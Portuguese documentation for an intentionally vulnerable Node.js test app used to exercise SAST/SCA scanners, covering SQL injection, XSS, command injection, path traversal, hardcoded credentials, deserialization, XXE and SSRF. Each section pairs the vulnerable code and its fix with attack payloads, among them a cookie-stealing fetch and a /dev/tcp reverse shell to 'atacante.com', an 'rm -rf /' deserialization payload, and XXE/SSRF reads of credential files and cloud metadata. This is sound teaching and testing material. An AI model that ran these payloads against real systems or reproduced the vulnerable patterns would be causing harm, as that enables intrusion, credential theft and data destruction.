# 📚 Documentação das Vulnerabilidades

Este documento descreve em detalhes todas as vulnerabilidades implementadas nesta aplicação Node.js para fins de teste com ferramentas SAST (Static Application Security Testing) e SCA (Software Composition Analysis) como Veracode.

## ⚠️ AVISO IMPORTANTE

**Esta aplicação contém vulnerabilidades de segurança INTENCIONAIS para fins educacionais e de teste. NUNCA use este código em produção!**

---

## 1. SQL Injection (CWE-89)

### 📍 Localização
- **Arquivo:** `app.js`
- **Rota:** `/buscar` (POST)
- **Linhas:** ~145-155

### 🔍 Descrição da Vulnerabilidade
SQL Injection é uma vulnerabilidade que permite que um atacante execute comandos SQL maliciosos no banco de dados da aplicação. Isso ocorre quando a entrada do usuário é concatenada diretamente em uma query SQL sem sanitização adequada.

### 💻 Código Vulnerável
```javascript
const email = req.body.email;
const query = `SELECT * FROM usuarios WHERE email = '${email}'`;
db.all(query, (err, rows) => { ... });
```

### 🎯 Por que é uma vulnerabilidade?
1. A entrada do usuário (`email`) é concatenada diretamente na query SQL
2. Não há validação ou escape de caracteres especiais
3. Um atacante pode inserir código SQL malicioso no campo de email

### 💥 Exemplo de Ataque
**Entrada maliciosa:**
```
' OR '1'='1
```

**Query resultante:**
```sql
SELECT * FROM usuarios WHERE email = '' OR '1'='1'
```

Isso retorna TODOS os usuários do banco de dados, pois a condição `'1'='1'` é sempre verdadeira.

**Ataque avançado (extração de dados):**
```
' UNION SELECT id, nome, senha, perfil FROM usuarios--
```

### ✅ Como Corrigir
Usar prepared statements (parameterized queries):
```javascript
const query = "SELECT * FROM usuarios WHERE email = ?";
db.all(query, [email], (err, rows) => { ... });
```

### 📖 Referências
- **CWE-89:** SQL Injection
- **OWASP Top 10:** A03:2021 – Injection
- **Severidade:** Crítica

---

## 2. Cross-Site Scripting - XSS (CWE-79)

### 📍 Localização
- **Arquivo:** `app.js`
- **Rota:** `/comentario` (POST)
- **Linhas:** ~192-208

### 🔍 Descrição da Vulnerabilidade
Cross-Site Scripting (XSS) é uma vulnerabilidade que permite que um atacante injete scripts maliciosos (geralmente JavaScript) que serão executados no navegador de outros usuários. Neste caso, temos um XSS Refletido (Reflected XSS).

### 💻 Código Vulnerável
```javascript
const comentario = req.body.comentario;
res.send(`
  <div style="border: 1px solid #ccc; padding: 10px;">
    ${comentario}
  </div>
`);
```

### 🎯 Por que é uma vulnerabilidade?
1. O conteúdo do comentário é inserido diretamente no HTML sem escape
2. Não há sanitização ou validação da entrada
3. Scripts maliciosos podem ser executados no navegador da vítima

### 💥 Exemplo de Ataque
**Entrada maliciosa:**
```html
<script>alert('XSS Vulnerável!')</script>
```

**Ataque para roubar cookies:**
```html
<script>
  fetch('http://atacante.com/roubar?cookie=' + document.cookie);
</script>
```

**Ataque de redirecionamento:**
```html
<script>window.location='http://site-malicioso.com'</script>
```

### ✅ Como Corrigir
Escapar/sanitizar a entrada do usuário:
```javascript
const escapeHtml = (text) => {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
};

const comentarioSeguro = escapeHtml(comentario);
res.send(`<div>${comentarioSeguro}</div>`);
```

Ou usar bibliotecas como DOMPurify ou validator.js.

### 📖 Referências
- **CWE-79:** Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
- **OWASP Top 10:** A03:2021 – Injection
- **Severidade:** Alta

---

## 3. Command Injection (CWE-78)

### 📍 Localização
- **Arquivo:** `app.js`
- **Rota:** `/executar` (POST)
- **Linhas:** ~243-265

### 🔍 Descrição da Vulnerabilidade
Command Injection permite que um atacante execute comandos arbitrários no sistema operacional do servidor. Isso ocorre quando a entrada do usuário é passada diretamente para funções que executam comandos do sistema.

### 💻 Código Vulnerável
```javascript
const comando = req.body.comando;
exec(comando, (error, stdout, stderr) => {
  // ...
});
```

### 🎯 Por que é uma vulnerabilidade?
1. A entrada do usuário é executada diretamente como comando do sistema
2. Não há whitelist de comandos permitidos
3. Não há validação ou escape de caracteres especiais
4. Um atacante pode executar qualquer comando no servidor

### 💥 Exemplo de Ataque
**Entrada maliciosa (listar arquivos sensíveis):**
```bash
ls -la /etc/passwd
```

**Ataque encadeado:**
```bash
ls; cat /etc/passwd; whoami
```

**Reverse shell:**
```bash
bash -i >& /dev/tcp/atacante.com/4444 0>&1
```

**Ler chaves SSH:**
```bash
cat ~/.ssh/id_rsa
```

### ✅ Como Corrigir
1. **Nunca** execute comandos baseados em entrada do usuário
2. Se necessário, use uma whitelist estrita:
```javascript
const comandosPermitidos = ['ls', 'pwd', 'date'];
if (!comandosPermitidos.includes(comando)) {
  return res.status(400).send('Comando não permitido');
}
```
3. Use bibliotecas específicas ao invés de exec() quando possível
4. Execute em ambiente sandboxed com permissões mínimas

### 📖 Referências
- **CWE-78:** OS Command Injection
- **OWASP Top 10:** A03:2021 – Injection
- **Severidade:** Crítica

---

## 4. Path Traversal (CWE-22)

### 📍 Localização
- **Arquivo:** `app.js`
- **Rota:** `/arquivo` (POST)
- **Linhas:** ~300-325

### 🔍 Descrição da Vulnerabilidade
Path Traversal (também conhecido como Directory Traversal) permite que um atacante acesse arquivos e diretórios fora do diretório pretendido. Isso pode expor arquivos sensíveis do sistema.

### 💻 Código Vulnerável
```javascript
const filename = req.body.filename;
const filepath = path.join(__dirname, filename);
fs.readFile(filepath, 'utf8', (err, data) => {
  // ...
});
```

### 🎯 Por que é uma vulnerabilidade?
1. Não há validação do nome do arquivo fornecido
2. `path.join()` não previne path traversal
3. Um atacante pode usar `../` para navegar para diretórios superiores
4. Arquivos sensíveis do sistema podem ser acessados

### 💥 Exemplo de Ataque
**Ler arquivo de senhas do sistema:**
```
../../../etc/passwd
```

**Ler chaves SSH:**
```
../.ssh/id_rsa
```

**Ler variáveis de ambiente:**
```
../../../proc/self/environ
```

**Ler configurações do banco:**
```
../../config/database.yml
```

### ✅ Como Corrigir
```javascript
const path = require('path');

const filename = req.body.filename;
const basePath = __dirname;

// Normaliza o caminho e verifica se está dentro do diretório permitido
const filepath = path.normalize(path.join(basePath, filename));

if (!filepath.startsWith(basePath)) {
  return res.status(400).send('Acesso negado');
}

// Whitelist de extensões permitidas
const allowedExtensions = ['.txt', '.json', '.md'];
const ext = path.extname(filepath);
if (!allowedExtensions.includes(ext)) {
  return res.status(400).send('Tipo de arquivo não permitido');
}
```

### 📖 Referências
- **CWE-22:** Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)
- **OWASP Top 10:** A01:2021 – Broken Access Control
- **Severidade:** Alta

---

## 5. Hardcoded Credentials (CWE-798)

### 📍 Localização
- **Arquivo:** `app.js`
- **Linhas:** ~23-25, 338-355

### 🔍 Descrição da Vulnerabilidade
Hardcoded Credentials é a prática de incluir credenciais (senhas, chaves de API, tokens) diretamente no código-fonte. Isso é extremamente perigoso porque:
1. As credenciais ficam expostas no repositório
2. Qualquer pessoa com acesso ao código pode ver as credenciais
3. É difícil rotacionar as credenciais sem modificar o código

### 💻 Código Vulnerável
```javascript
const DB_USER = 'admin';
const DB_PASSWORD = 'senha123';
const API_KEY = 'sk-1234567890abcdefghijklmnopqrstuvwxyz';

app.get('/config', (req, res) => {
  res.send(`
    <p><strong>Usuário do Banco:</strong> ${DB_USER}</p>
    <p><strong>Senha do Banco:</strong> ${DB_PASSWORD}</p>
    <p><strong>API Key:</strong> ${API_KEY}</p>
  `);
});
```

### 🎯 Por que é uma vulnerabilidade?
1. Credenciais estão visíveis no código-fonte
2. Podem ser encontradas no histórico do Git
3. Desenvolvedores e atacantes podem acessá-las facilmente
4. Violação de conformidade (PCI-DSS, LGPD, etc.)

### 💥 Exemplo de Ataque
Um atacante pode:
1. Buscar no GitHub por "senha", "password", "api_key"
2. Acessar o histórico do Git para encontrar credenciais antigas
3. Usar as credenciais para acessar sistemas
4. Explorar bancos de dados e APIs

### ✅ Como Corrigir
Use variáveis de ambiente:

**arquivo .env:**
```
DB_USER=admin
DB_PASSWORD=senha_super_secreta
API_KEY=sua_api_key_aqui
```

**código seguro:**
```javascript
require('dotenv').config();

const DB_USER = process.env.DB_USER;
const DB_PASSWORD = process.env.DB_PASSWORD;
const API_KEY = process.env.API_KEY;

// NUNCA exponha credenciais em endpoints
app.get('/config', (req, res) => {
  res.send('Configurações carregadas com sucesso');
});
```

**Adicione .env ao .gitignore:**
```
.env
```

### 📖 Referências
- **CWE-798:** Use of Hard-coded Credentials
- **OWASP Top 10:** A07:2021 – Identification and Authentication Failures
- **Severidade:** Crítica

---

## 6. Insecure Deserialization (CWE-502)

### 📍 Localização
- **Arquivo:** `app.js`
- **Rota:** `/cookie` (POST), `/cookie/ler` (GET)
- **Linhas:** ~392-440

### 🔍 Descrição da Vulnerabilidade
Insecure Deserialization ocorre quando dados não confiáveis são usados para deserializar objetos. Isso pode levar à execução remota de código (RCE), pois a deserialização pode executar código arbitrário.

### 💻 Código Vulnerável
```javascript
// Serialização
const serialized = serialize.serialize(JSON.parse(userData));
res.cookie('userData', serialized);

// Deserialização
const userData = serialize.unserialize(cookie);
```

### 🎯 Por que é uma vulnerabilidade?
1. A biblioteca `node-serialize` é conhecida por vulnerabilidades
2. Deserialização sem validação pode executar código
3. Um atacante pode modificar cookies para injetar código malicioso
4. Pode levar a Remote Code Execution (RCE)

### 💥 Exemplo de Ataque
**Payload malicioso para RCE:**
```javascript
{"nome":"_$$ND_FUNC$$_function(){require('child_process').exec('calc.exe', function(error, stdout, stderr){});}()"}
```

Quando deserializado, este payload executa o comando `calc.exe` no servidor.

**Exemplo de ataque real:**
```javascript
var payload = {
  "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('rm -rf /', function(error, stdout, stderr){});}()"
};
```

### ✅ Como Corrigir
1. **Nunca** deserialize dados não confiáveis
2. Use JSON.parse/JSON.stringify ao invés de bibliotecas de serialização
3. Valide e sanitize todos os dados antes de deserializar
4. Use assinatura digital (HMAC) para validar integridade dos dados

```javascript
// Solução segura
const userData = JSON.parse(req.body.userData);

// Validar estrutura
if (!userData.nome || typeof userData.nome !== 'string') {
  return res.status(400).send('Dados inválidos');
}

// Salvar apenas dados validados
res.cookie('userData', JSON.stringify({
  nome: userData.nome,
  admin: false // Sempre forçar admin=false
}), {
  httpOnly: true,
  secure: true,
  signed: true
});
```

### 📖 Referências
- **CWE-502:** Deserialization of Untrusted Data
- **OWASP Top 10:** A08:2021 – Software and Data Integrity Failures
- **Severidade:** Crítica

---

## 7. XML External Entity - XXE (CWE-611)

### 📍 Localização
- **Arquivo:** `app.js`
- **Rota:** `/xml` (POST)
- **Linhas:** ~485-515

### 🔍 Descrição da Vulnerabilidade
XML External Entity (XXE) é uma vulnerabilidade que ocorre quando um parser XML processa entidades externas definidas no documento XML. Isso permite que um atacante leia arquivos locais, execute requisições SSRF, ou cause Denial of Service.

### 💻 Código Vulnerável
```javascript
const xmlData = req.body.xml;
const xmlDoc = libxmljs.parseXml(xmlData, { 
  noblanks: true, 
  noent: true,    // PERIGOSO: processa entidades
  nocdata: true 
});
```

### 🎯 Por que é uma vulnerabilidade?
1. O parser está configurado para processar entidades externas (`noent: true`)
2. Não há validação do conteúdo XML
3. Um atacante pode definir entidades que referenciam arquivos locais
4. Pode levar a exposição de dados sensíveis

### 💥 Exemplo de Ataque
**Ler arquivo /etc/passwd:**
```xml
<?xml version="1.0"?>
<!DOCTYPE dados [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<dados>
  <nome>&xxe;</nome>
</dados>
```

**SSRF via XXE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE dados [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<dados>
  <nome>&xxe;</nome>
</dados>
```

**Denial of Service (Billion Laughs Attack):**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<dados>&lol3;</dados>
```

### ✅ Como Corrigir
Desabilitar entidades externas:

```javascript
const xmlDoc = libxmljs.parseXml(xmlData, { 
  noblanks: true, 
  noent: false,     // Desabilita entidades
  nocdata: true,
  nonet: true,      // Desabilita acesso à rede
  dtdload: false,   // Desabilita carregamento de DTD
  dtdvalid: false   // Desabilita validação de DTD
});
```

Ou use bibliotecas mais seguras e atualizadas.

### 📖 Referências
- **CWE-611:** Improper Restriction of XML External Entity Reference
- **OWASP Top 10:** A05:2021 – Security Misconfiguration
- **Severidade:** Alta

---

## 8. Server-Side Request Forgery - SSRF (CWE-918)

### 📍 Localização
- **Arquivo:** `app.js`
- **Rota:** `/proxy` (POST)
- **Linhas:** ~552-585

### 🔍 Descrição da Vulnerabilidade
Server-Side Request Forgery (SSRF) permite que um atacante force o servidor a fazer requisições HTTP para destinos arbitrários. Isso pode expor serviços internos, metadados de cloud, ou permitir ataques a outros sistemas.

### 💻 Código Vulnerável
```javascript
const url = req.body.url;
request(url, (error, response, body) => {
  res.send(body);
});
```

### 🎯 Por que é uma vulnerabilidade?
1. Não há validação da URL fornecida
2. O servidor pode acessar recursos internos não disponíveis externamente
3. Pode expor serviços na rede interna (localhost, 192.168.x.x)
4. Em ambientes cloud, pode expor metadados sensíveis

### 💥 Exemplo de Ataque
**Acessar metadados da AWS:**
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Port scanning interno:**
```
http://192.168.1.1:22
http://192.168.1.1:3306
http://192.168.1.1:5432
```

**Acessar serviços internos:**
```
http://localhost:6379  (Redis)
http://localhost:27017 (MongoDB)
http://localhost:9200  (Elasticsearch)
```

**Ler arquivos locais (se permitido pelo protocolo):**
```
file:///etc/passwd
```

### ✅ Como Corrigir
Implementar whitelist de domínios e validações:

```javascript
const url = require('url');

const targetUrl = req.body.url;
const parsedUrl = url.parse(targetUrl);

// Whitelist de domínios permitidos
const allowedDomains = ['exemplo.com', 'api.exemplo.com'];

// Blacklist de IPs privados
const blockedPatterns = [
  /^127\./,          // localhost
  /^10\./,           // Rede privada classe A
  /^172\.(1[6-9]|2\d|3[01])\./, // Rede privada classe B
  /^192\.168\./,     // Rede privada classe C
  /^169\.254\./,     // Link-local
  /^0\./,            // Rede "este"
  /^::1$/,           // IPv6 localhost
  /^fe80:/,          // IPv6 link-local
];

// Validar protocolo
if (parsedUrl.protocol !== 'http:' && parsedUrl.protocol !== 'https:') {
  return res.status(400).send('Protocolo não permitido');
}

// Validar domínio
if (!allowedDomains.includes(parsedUrl.hostname)) {
  return res.status(400).send('Domínio não permitido');
}

// Validar contra IPs privados
for (const pattern of blockedPatterns) {
  if (pattern.test(parsedUrl.hostname)) {
    return res.status(400).send('IP privado não permitido');
  }
}

// Fazer a requisição com timeout
request({
  url: targetUrl,
  timeout: 5000,
  maxRedirects: 0
}, (error, response, body) => {
  // ...
});
```

### 📖 Referências
- **CWE-918:** Server-Side Request Forgery (SSRF)
- **OWASP Top 10:** A10:2021 – Server-Side Request Forgery
- **Severidade:** Alta

---

## 9. Vulnerabilidades de SCA (Software Composition Analysis)

### 🔍 Descrição
As vulnerabilidades de SCA são encontradas nas dependências (bibliotecas de terceiros) usadas pela aplicação. Este projeto usa intencionalmente versões antigas e vulneráveis de bibliotecas para demonstração.

### 📦 Dependências Vulneráveis

#### 1. **express 4.17.1**
- Versões antigas do Express podem ter vulnerabilidades conhecidas
- Verificar CVE relacionadas

#### 2. **lodash 4.17.19**
- **CVE-2020-8203:** Prototype Pollution
- Permite modificação do protótipo de objetos JavaScript
- Severidade: Alta

#### 3. **ejs 3.1.6**
- Vulnerabilidades de template injection em versões antigas
- Permite execução de código através de templates

#### 4. **node-serialize 0.0.4**
- **CVE-2017-5941:** Remote Code Execution via deserialization
- Biblioteca conhecida por permitir RCE
- Severidade: Crítica

#### 5. **libxmljs 0.19.7**
- Versão antiga com possíveis vulnerabilidades XXE
- Verificar atualizações de segurança

#### 6. **request 2.88.2**
- Biblioteca depreciada, não recebe mais updates de segurança
- Recomendado migrar para axios ou node-fetch

### ✅ Como Detectar (com Veracode SCA)
```bash
# O Veracode SCA analisará o package.json e package-lock.json
# e identificará todas as vulnerabilidades conhecidas nas dependências
```

### 📖 Referências
- **CWE-1035:** Using Components with Known Vulnerabilities
- **OWASP Top 10:** A06:2021 – Vulnerable and Outdated Components

---

## 🛠️ Como Testar as Vulnerabilidades

### Pré-requisitos
```bash
npm install
npm start
```

### Testes Manuais

#### 1. SQL Injection
```bash
curl -X POST http://localhost:3000/buscar \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=' OR '1'='1"
```

#### 2. XSS
```bash
curl -X POST http://localhost:3000/comentario \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "comentario=<script>alert('XSS')</script>"
```

#### 3. Command Injection
```bash
curl -X POST http://localhost:3000/executar \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "comando=ls; whoami"
```

#### 4. Path Traversal
```bash
curl -X POST http://localhost:3000/arquivo \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "filename=../../../etc/passwd"
```

---

## 📊 Resumo das Vulnerabilidades

| # | Vulnerabilidade | CWE | Severidade | OWASP Top 10 |
|---|----------------|-----|-----------|--------------|
| 1 | SQL Injection | CWE-89 | Crítica | A03:2021 |
| 2 | Cross-Site Scripting (XSS) | CWE-79 | Alta | A03:2021 |
| 3 | Command Injection | CWE-78 | Crítica | A03:2021 |
| 4 | Path Traversal | CWE-22 | Alta | A01:2021 |
| 5 | Hardcoded Credentials | CWE-798 | Crítica | A07:2021 |
| 6 | Insecure Deserialization | CWE-502 | Crítica | A08:2021 |
| 7 | XML External Entity (XXE) | CWE-611 | Alta | A05:2021 |
| 8 | SSRF | CWE-918 | Alta | A10:2021 |
| 9 | Componentes Vulneráveis | CWE-1035 | Variável | A06:2021 |

---

## 🔍 Ferramentas de Teste Recomendadas

### SAST (Static Application Security Testing)
- **Veracode Static Analysis**
- SonarQube
- Checkmarx
- Fortify

### SCA (Software Composition Analysis)
- **Veracode SCA**
- Snyk
- WhiteSource
- OWASP Dependency-Check

### DAST (Dynamic Application Security Testing)
- Burp Suite
- OWASP ZAP
- Acunetix
- Netsparker

---

## 📚 Recursos Adicionais

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE - Common Weakness Enumeration](https://cwe.mitre.org/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Veracode Docs](https://docs.veracode.com/)

---

## ⚖️ Licença e Disclaimer

Este código é fornecido apenas para fins educacionais e de teste. Os autores não se responsabilizam pelo uso indevido deste código. Use apenas em ambientes controlados e com autorização apropriada.

**NÃO USAR EM PRODUÇÃO!**
